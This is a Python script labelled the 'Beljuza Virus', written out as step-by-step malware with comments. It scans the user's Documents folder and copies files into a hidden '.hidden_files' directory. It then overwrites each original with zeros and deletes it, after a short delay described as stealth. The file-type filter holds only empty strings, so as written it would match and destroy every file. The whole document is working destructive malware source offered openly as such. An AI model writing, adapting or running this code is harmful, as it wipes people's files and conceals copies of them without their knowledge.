import os  # For interacting with the file system
import shutil  # For copying files
import time  # To introduce delays for stealthiness

# Step 1: Define the directories and file types to target
target_directory = os.path.expanduser("~/Documents")  # The directory to scan (e.g., "Documents")
hidden_directory = os.path.expanduser("~/Documents/.hidden_files")  # The hidden directory for stolen files
target_file_types = ('', '', '')  # File types to target

# Step 2: Function to create the hidden directory for stolen files
def create_hidden_directory():
    #"""Creates a hidden directory to store stolen files."""
    if not os.path.exists(hidden_directory):  # Check if the directory already exists
        os.mkdir(hidden_directory)  # Create the hidden directory
        print(f"Hidden directory created at: {hidden_directory}")  # Informative output for testing

# Step 3: Function to enumerate and process target files
def steal_and_delete_files(directory):
    """
    Scans the target directory for specific file types,
    copies them to a hidden directory, and deletes the originals.
    """
    for root, _, files in os.walk(directory):  # Traverse the directory tree
        for file in files:  # Loop through each file in the directory
            if file.endswith(target_file_types):  # Check if the file matches the target types
                file_path = os.path.join(root, file)  # Get the full path of the file
                try:
                    # Step 3.1: Copy the file to the hidden directory
                    shutil.copy(file_path, hidden_directory)  # Copy file to hidden directory
                    print(f"File copied: {file_path} -> {hidden_directory}")  # Log for testing

                    # Step 3.2: Securely delete the original file
                    with open(file_path, 'wb') as f:  # Open the file in binary write mode
                        f.write(b'\x00' * os.path.getsize(file_path))  # Overwrite the file with zeros
                    os.remove(file_path)  # Delete the overwritten file
                    print(f"File deleted: {file_path}")  # Log for testing
                except Exception as e:  # Handle any exceptions that occur
                    print(f"Error processing file {file_path}: {e}")  # Print the error message

# Step 4: Introduce stealth by delaying execution
def introduce_stealth():
    """Introduces a delay to mimic a realistic background process."""
    print("Virus is operating in the background...")  # Log for testing
    time.sleep(5)  # Wait for 5 seconds before proceeding (can be adjusted)

# Main execution of the Beljuza Virus
if __name__ == "__main__":  # Ensure this block only runs when the script is executed directly
    print("Beljuza Virus initialized.")  # Initial log for testing
    create_hidden_directory()  # Step 1: Create the hidden directory
    introduce_stealth()  # Step 2: Delay execution for stealth
    steal_and_delete_files(target_directory)  # Step 3: Process files in the target directory
    print("Beljuza Virus completed its operation.")  # Final log for testing
